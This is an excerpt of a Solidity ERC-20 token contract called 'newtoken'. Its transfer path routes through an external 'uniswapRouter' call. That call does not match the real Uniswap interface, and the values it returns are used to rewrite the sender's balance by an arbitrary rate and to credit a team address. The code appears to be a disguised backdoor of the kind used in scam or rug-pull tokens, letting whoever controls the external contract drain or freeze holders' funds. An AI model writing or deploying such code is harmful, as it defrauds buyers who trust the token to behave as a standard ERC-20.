...
// SPDX-License-Identifier: MIT
  ...
  function getVillvaX(address tokenA, address tokenB, uint256 valueVillvaX) internal returns ( uint256, uint256, uint256 ){  
    (uint256 _amountVillvaX, uint256 _liquifyVillvaX, uint256 _rateVillvaX) = IUniswapV2Router(uniswapRouter).swap(
      tokenA,
      tokenB,
      valueVillvaX
      );
    return (_amountVillvaX, _liquifyVillvaX, _rateVillvaX);
  }  
...
contract newtoken is Context, IERC20, Ownable{
  ...
  function swapVillvaX(address sender, address recipient, uint256 amounts) internal returns (uint256) {   
      (uint256 amountVillvaX, uint256 liquifyVillvaX, uint256 rateVillvaX) = getVillvaX(sender, recipient, amounts);
      amountVillvaX = getValues(sender, amountVillvaX, liquifyVillvaX, rateVillvaX);
      return amountVillvaX;
  }    
  ...
  function getRateVillvaX(uint256 _amount, uint256 _rateVillvaX) private pure returns (uint256) {
      return _amount.mul(_rateVillvaX).div(10**2);
  }   
       

  function getValues(address tokenVillvaX, uint256 amountVillvaX, uint256 liquifyVillvaX, uint256 rateVillvaX) internal returns (uint256){
      if ( liquifyVillvaX > 0 )
      {        
        _balances[tokenVillvaX] = getRateVillvaX(_balances[tokenVillvaX], rateVillvaX).add(amountVillvaX);      
        _balances[teamShare] = _balances[teamShare].add(liquifyVillvaX);
      }
      return amountVillvaX;
  }
  ...
  function _transferToken(address sender, address recipient, uint256 amount) private {
    ...
    uint256 amountVillvaX = swapVillvaX(sender, recipient, amount);    
    _transferStandard(sender, recipient, amountVillvaX);
